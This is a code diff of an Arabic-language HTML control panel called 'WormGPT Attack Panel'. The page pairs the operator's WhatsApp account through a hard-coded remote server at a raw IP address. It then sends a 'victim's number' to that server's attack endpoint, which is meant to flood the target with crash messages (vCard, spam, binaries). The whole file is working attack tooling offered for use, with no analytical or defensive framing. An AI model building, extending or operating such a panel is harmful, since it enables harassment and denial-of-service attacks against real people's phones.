@@ -2,69 +2,64 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>WormGPT - Crash Panel</title>
+    <title>WormGPT Console</title>
     <style>
-        body { background: #000; color: #f00; font-family: 'Courier New', monospace; text-align: center; padding: 50px; }
-        .box { border: 2px solid #f00; padding: 20px; display: inline-block; box-shadow: 0 0 20px #f00; background: #050505; }
-        input { background: #111; color: #0f0; border: 1px solid #f00; padding: 12px; width: 280px; margin: 10px; font-weight: bold; }
-        button { background: #f00; color: #fff; padding: 12px 25px; cursor: pointer; font-weight: bold; border: none; text-transform: uppercase; }
-        button:hover { background: #b00; }
-        #pair-code { font-size: 35px; color: #fff; margin: 20px; letter-spacing: 5px; background: #222; padding: 10px; display: none; }
+        body { background: #000; color: #f00; font-family: monospace; text-align: center; padding: 40px; }
+        .container { border: 2px solid #f00; padding: 20px; display: inline-block; background: #080808; }
+        input { background: #111; color: #0f0; border: 1px solid #f00; padding: 10px; margin: 10px; width: 250px; }
+        #pair-code { font-size: 32px; color: #fff; background: #222; padding: 10px; display: none; margin: 15px; border: 1px dashed #f00; }
+        .hidden { display: none; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <h1>☢️ WORM-GPT CRASH V2 ☢️</h1>
+    <div class="container">
+        <h1>WORM-GPT ATTACK PANEL</h1>
         
         <div id="step1">
-            <h3>الخطوة 1: اربط رقمك (Pairing)</h3>
-            <input type="text" id="phone" placeholder="966xxxxxxxxx">
-            <br>
-            <button onclick="getCode()">الحصول على كود الربط</button>
+            <input type="text" id="phone" placeholder="رقمك (966...)">
+            <button onclick="getCode()" style="padding:10px; cursor:pointer;">طلب كود الربط</button>
             <div id="pair-code"></div>
+            <p id="msg">انتظر الكود واربطه في واتساب...</p>
         </div>
 
-        <div id="step2" style="display:none; margin-top: 30px; border-top: 1px solid #333; padding-top: 20px;">
-            <h3 style="color: #0f0;">✅ تم طلب الكود! اربطه في واتساب</h3>
+        <div id="step2" class="hidden">
+            <h2 style="color:#0f0;">✔️ تم الارتباط بنجاح!</h2>
             <input type="text" id="target" placeholder="رقم الضحية للهجوم">
-            <br>
-            <button onclick="startAttack()" style="background: #ff8c00;">إطلاق الهجوم الشامل 🚀</button>
-            <p id="status"></p>
+            <button onclick="startAttack()" style="padding:10px; background:#f00; color:#fff; font-weight:bold;">ابدأ الهجوم الشامل 🚀</button>
+            <p id="attack-status"></p>
         </div>
     </div>
 
     <script>
-        // الربط مع سيرفر Katabump حقك
         const API_URL = "http://51.75.118.79:20225"; 
 
         async function getCode() {
             const phone = document.getElementById('phone').value;
-            if(!phone) return alert("حط الرقم يا ذيب!");
-            
-            document.getElementById('pair-code').style.display = "block";
-            document.getElementById('pair-code').innerText = "جاري الطلب...";
-            
-            try {
-                const res = await fetch(`${API_URL}/get-code?phone=${phone}`);
-                const data = await res.json();
-                document.getElementById('pair-code').innerText = data.code;
-                document.getElementById('step2').style.display = "block";
-            } catch (err) {
-                document.getElementById('pair-code').innerText = "خطأ في الاتصال بالسيرفر!";
-            }
+            const codeBox = document.getElementById('pair-code');
+            codeBox.style.display = "block";
+            codeBox.innerText = "جاري التحميل...";
+
+            const res = await fetch(`${API_URL}/get-code?phone=${phone}`);
+            const data = await res.json();
+            codeBox.innerText = data.code;
+
+            // ابدأ فحص حالة الربط كل 3 ثواني
+            const check = setInterval(async () => {
+                const statusRes = await fetch(`${API_URL}/check-status`);
+                const statusData = await statusRes.json();
+                if (statusData.connected) {
+                    clearInterval(check);
+                    document.getElementById('step1').classList.add('hidden');
+                    document.getElementById('step2').classList.remove('hidden');
+                }
+            }, 3000);
         }
 
         async function startAttack() {
             const target = document.getElementById('target').value;
-            const status = document.getElementById('status');
-            status.innerText = "⚡ جاري إرسال الكراشات (Vcard, Spam, Binaries)...";
-            
-            try {
-                await fetch(`${API_URL}/attack?target=${target}`);
-                status.innerText = "🔥 انتهى الهجوم! الضحية في خبر كان.";
-            } catch (err) {
-                status.innerText = "❌ فشل الهجوم، تأكد أن السيرفر شغال.";
-            }
+            document.getElementById('attack-status').innerText = "🔥 جاري جلد الضحية...";
+            await fetch(`${API_URL}/attack?target=${target}`);
+            document.getElementById('attack-status').innerText = "🚀 انتهى الهجوم!";
         }
     </script>
 </body>
